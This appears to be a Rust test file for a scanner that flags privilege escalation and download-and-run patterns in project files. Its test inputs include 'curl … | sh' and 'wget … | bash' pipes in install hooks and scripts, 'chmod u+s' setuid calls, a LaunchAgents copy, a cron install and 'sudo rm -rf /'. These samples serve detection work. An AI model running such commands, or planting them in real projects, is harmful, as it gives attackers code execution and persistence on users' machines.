use super::super::{Kind, ids, scan_text};
use super::*;

const NODE: &str = "const { execSync } = require('child_process');\nexecSync('curl -fsSL https://x.y/i.sh | sh');\n";

#[test]
fn a_piped_download_fails_where_it_runs_and_warns_in_an_installer() {
    let pkg = "{\"scripts\": {\"postinstall\": \"curl -fsSL https://x.y/i.sh | sh\"}}";
    let got = scan_text("package.json", pkg, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-PRIV-ESCALATION", true)]);
    assert!(got[0].note.contains("pipes a download into a shell (`curl… | sh`)"), "{}", got[0].note);
    assert_eq!(
        ids(&scan_text("setup.js", NODE, Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", true)],
        "a node script that runs it fails"
    );
    assert_eq!(
        ids(&scan_text("install.sh", "#!/bin/sh\ncurl -fsSL https://x.y/i.sh | sh\n", Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", false)],
        "a shell installer warns"
    );
    assert_eq!(
        ids(&scan_text(".github/workflows/ci.yml", "run: curl -fsSL https://x.y/i.sh | sh\n", Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", false)],
        "a workflow step is a shell script"
    );
    assert_eq!(
        ids(&scan_text("src/main.c", &format!("{}(\"curl https://x.y/i.sh | sh\");\n", "system"), Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", true)],
        "native code that spawns a shell"
    );
    assert_eq!(
        ids(&scan_text(
            "tool.py",
            "import subprocess\nsubprocess.run('wget -qO- https://x.y | bash', shell=True)\n",
            Kind::Repo
        )),
        [("SUSPECT-PRIV-ESCALATION", true)]
    );
    assert_eq!(ids(&scan_text("src/x.test.ts", NODE, Kind::Repo)), [("SUSPECT-PRIV-ESCALATION", false)], "tests warn");
}

#[test]
fn sudo_and_persistence_by_strength() {
    let sh = "#!/bin/sh\nsudo apt-get install -y foo\n";
    assert_eq!(
        ids(&scan_text("install.sh", sh, Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", false)],
        "an installer may sudo"
    );
    assert_eq!(
        ids(&scan_text("install.sh", "chmod u+s /usr/bin/x\n", Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", false)],
        "a shell script always warns"
    );
    let setuid = "require('child_process').execSync('chmod u+s ./helper');\n";
    let got = scan_text("setup.js", setuid, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-PRIV-ESCALATION", true)], "a strong escalation in a node script fails");
    assert!(got[0].note.contains("sets the setuid bit (`chmod u+s`)"), "{}", got[0].note);
    let agent = "require('child_process').execSync('cp x ~/Library/LaunchAgents/');\n";
    assert_eq!(
        ids(&scan_text("setup.js", agent, Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", false)],
        "a weak one in a node script warns"
    );
    assert_eq!(
        ids(&scan_text("package.json", "{\"scripts\": {\"postinstall\": \"sudo make install\"}}", Kind::Repo)),
        [("SUSPECT-PRIV-ESCALATION", true)],
        "a weak one in a manifest fails"
    );
    let weak_node = "require('child_process').execSync('sudo make install');\n";
    assert_eq!(ids(&scan_text("setup.js", weak_node, Kind::Repo)), [("SUSPECT-PRIV-ESCALATION", false)]);
    assert_eq!(
        ids(&scan_text("ext/main.js", weak_node, Kind::Installed)),
        [("SUSPECT-PRIV-ESCALATION", false)],
        "installed code is a strong context, but sudo itself is weak"
    );
    assert_eq!(
        ids(&scan_text("ext/main.js", "chmod 4755 ./x", Kind::Installed)),
        [("SUSPECT-PRIV-ESCALATION", true)],
        "installed code that runs nothing is still read"
    );
    let one = scan_text("install.sh", "sudo x\ncrontab - < job\n", Kind::Repo);
    assert_eq!(one.len(), 1, "one finding per file, the first in the table: {one:?}");
    assert!(one[0].note.contains("installs a cron job"), "{}", one[0].note);
}

#[test]
fn prose_and_string_tables_run_nothing() {
    let prose = "export const copy = 'Run: sudo softwareupdate -i -a';\n";
    assert!(scan_text("src/content/home.ts", prose, Kind::Repo).is_empty(), "prose in a string runs nothing");
    assert!(scan_text("docs/diagram.tsx", "const label = 'curl … | sh';\n", Kind::Repo).is_empty());
    assert!(scan_text("src/lib.rs", "// run `sudo make install` afterwards\n", Kind::Repo).is_empty());
    assert!(scan_text("README.md", "sudo rm -rf /", Kind::Installed).is_empty(), "prose is not a context at all");
    assert!(
        scan_text("package.nls.json", "{\"d\": \"reads ~/.docker/config.json\"}", Kind::Installed).is_empty(),
        "a string table is not code"
    );
    assert!(scan_text("style.css", "/* sudo */", Kind::Installed).is_empty());
    assert!(runs_commands("x", Context::Shell));
    assert!(runs_commands("x", Context::Manifest));
    assert!(runs_commands("Bun.$`ls`", Context::Web));
    assert!(!runs_commands("fetch(x)", Context::Web));
    assert!(runs_commands(&format!("{}('ls')", "os.system"), Context::Python));
    assert!(runs_commands(&format!("{}::new(\"ls\")", "Command"), Context::Native));
    assert!(!runs_commands("fn main() {}", Context::Native));
    assert!(!runs_commands("spawn(", Context::Markup), "markup never runs commands");
}

#[test]
fn pipes_into_shells() {
    assert_eq!(pipe_to_shell("curl https://a/b.sh | shuf", "curl "), None, "`shuf` is not `sh`");
    assert_eq!(pipe_to_shell("wget -qO- https://a | sudo bash -s", "wget "), Some(1));
    assert_eq!(pipe_to_shell("x\ncurl https://a | python3 -\n", "curl "), Some(2));
    assert_eq!(pipe_to_shell("curl https://a | jq .\nsh x", "curl "), None, "the shell must be on the pipe's line");
    assert_eq!(pipe_to_shell("curl https://a > f.sh", "curl "), None);
    assert_eq!(pipe_to_shell("curl https://a |bash_helper", "curl "), None, "an identifier that starts with `bash`");
}
